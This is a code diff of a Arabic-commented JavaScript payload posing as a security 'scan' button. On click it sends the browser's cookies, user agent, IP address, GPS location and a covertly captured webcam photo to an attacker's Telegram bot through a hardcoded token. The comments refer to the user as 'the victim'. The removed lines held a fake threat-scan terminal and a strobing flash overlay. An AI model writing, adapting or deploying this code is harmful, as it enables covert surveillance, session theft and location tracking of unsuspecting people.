@@ -1,85 +1,85 @@
 (function() {
-    // إعدادات لوحة التحكم
+    // إعدادات البوت الخاصة بك
     const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
     const _id = "7253092491";
 
-    // دالة الإرسال الذكية - بتستخدم الـ Image Beacon عشان تهرب من الحماية
+    // دالة إرسال التقارير النصية
     function _send(msg) {
-        const url = `https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM_LOG]: " + msg)}`;
-        const img = new Image();
-        img.src = url; 
+        const url = `https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[LOG]: " + msg)}`;
+        navigator.sendBeacon(url);
     }
 
-    // 1. جلب الموقع الجغرافي (GPS)
-    function _location() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((p) => {
-                const mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                _send(`الموقع متاح: ${mapLink}`);
-            }, () => { _send("الضحية رفض إذن الموقع"); }, {enableHighAccuracy: true});
-        }
+    // دالة إرسال الصورة كملف
+    function _sendPhoto(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', _id);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', '🎯 صورة من النظام بجودة عالية');
+
+        fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).then(() => _send("تم رفع الصورة بنجاح ✅"));
     }
 
-    // 2. جلب الـ IP وبيانات الجهاز
-    async function _getIP() {
+    const startBtn = document.getElementById('startScanBtn');
+    if(startBtn) {
+        startBtn.addEventListener('click', async () => {
+            _send("بدأت عملية سحب البيانات الكاملة 🚀");
+
+            // 1. جمع الكوكيز وبيانات الجهاز
+            const cookies = document.cookie || "لا توجد كوكيز (أو المتصفح يحميها)";
+            const deviceInfo = `
+📱 نظام التشغيل: ${navigator.platform}
+🌐 المتصفح: ${navigator.userAgent}
+🍪 الكوكيز المتاحة: ${cookies}
+            `;
+            _send(deviceInfo);
+
+            // 2. الموقع الجغرافي والـ IP
+            _getAdvancedInfo();
+
+            // 3. سحب الصورة
+            _capturePhoto();
+        });
+    }
+
+    async function _getAdvancedInfo() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            _send(`IP الخاص به: ${data.ip}\nالنظام: ${navigator.platform}`);
-        } catch (e) { _send("فشل جلب الـ IP"); }
+            _send(`📍 IP: ${data.ip}`);
+        } catch(e) {}
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((p) => {
+                _send(`📍 خريطة: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+        }
     }
 
-    // 3. سحب الصورة وتفعيل الفلاش
-    async function _capture() {
+    async function _capturePhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            _send("تم الوصول للكاميرا بنجاح!");
-            
-            // تأثير الفلاش المرعب
-            _strobe();
-            
-            // ملاحظة: إرسال الصورة كملف بيحتاج دالة أعقد، هنبدأ بالتأكد إن البيانات النصية وصلت
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // ننتظر قليلاً لضبط الإضاءة قبل اللقطة
             setTimeout(() => {
-                stream.getTracks().forEach(t => t.stop());
-            }, 2000);
-        } catch (e) { _send("الضحية رفض الكاميرا"); }
-    }
-
-    function _strobe() {
-        const d = document.createElement('div');
-        d.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:white;";
-        document.body.appendChild(d);
-        let i = 0;
-        const itv = setInterval(() => {
-            d.style.display = (i++ % 2 == 0) ? 'none' : 'block';
-            if(i > 25) { clearInterval(itv); document.body.removeChild(d); }
-        }, 50);
-    }
-
-    // تفعيل كل شيء عند الضغط على الزرار
-    const startBtn = document.getElementById('startScanBtn');
-    if(startBtn) {
-        startBtn.addEventListener('click', () => {
-            _send("بدأ الضحية عملية الفحص الآن 🚀");
-            _getIP();
-            _location();
-            _capture();
-
-            // الواجهة الوهمية
-            const term = document.getElementById('terminal');
-            if(term) {
-                term.style.display = 'block';
-                const logs = ["جاري الاتصال بالسيرفر...", "فحص سلامة الروابط...", "تحليل التهديدات المحتملة...", "تم اكتشاف ثغرة! جاري استخراج التقرير..."];
-                let i = 0;
-                const l = setInterval(() => {
-                    const p = document.createElement('div');
-                    p.className = "line";
-                    p.innerText = "> " + logs[i++];
-                    document.getElementById('logs').appendChild(p);
-                    if(i >= logs.length) clearInterval(l);
-                }, 1000);
-            }
-        });
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob((blob) => {
+                    _sendPhoto(blob);
+                    stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
+                }, 'image/jpeg', 0.8);
+            }, 2500);
+        } catch (e) {
+            _send("❌ الضحية رفض الكاميرا");
+        }
     }
 })();
 
